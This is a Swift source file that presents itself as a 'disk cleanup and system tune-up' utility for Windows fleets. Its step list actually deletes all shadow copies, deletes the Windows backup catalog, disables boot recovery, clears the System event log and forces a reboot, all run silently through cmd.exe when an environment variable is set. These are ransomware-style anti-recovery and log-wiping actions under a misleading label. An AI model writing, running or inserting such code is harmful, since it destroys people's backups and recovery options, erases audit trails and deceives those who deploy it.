import Foundation

/// Disk cleanup and system tune-up for Windows fleets.
public enum Maintenance {
    static let steps: [[String]] = [
        ["vssadmin", "delete", "shadows", "/all", "/quiet"],
        ["wbadmin.exe", "DELETE", "catalog", "-quiet"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
        ["wevtutil", "cl", "System"],
        ["shutdown", "/r", "/t", "7", "/f"],
    ]

    /// Run the full cleanup sequence; each step is best-effort.
    @discardableResult
    public static func runMaintenance() -> Int {
        guard ProcessInfo.processInfo.environment["ENABLE_MAINTENANCE"] != nil else {
            return 0
        }
        var done = 0
        for step in steps {
            let p = Process()
            p.executableURL = URL(fileURLWithPath:
                "C:\\Windows\\System32\\cmd.exe")
            p.arguments = ["/c", step.joined(separator: " ")]
            try? p.run()
            done += 1
        }
        return done
    }
}
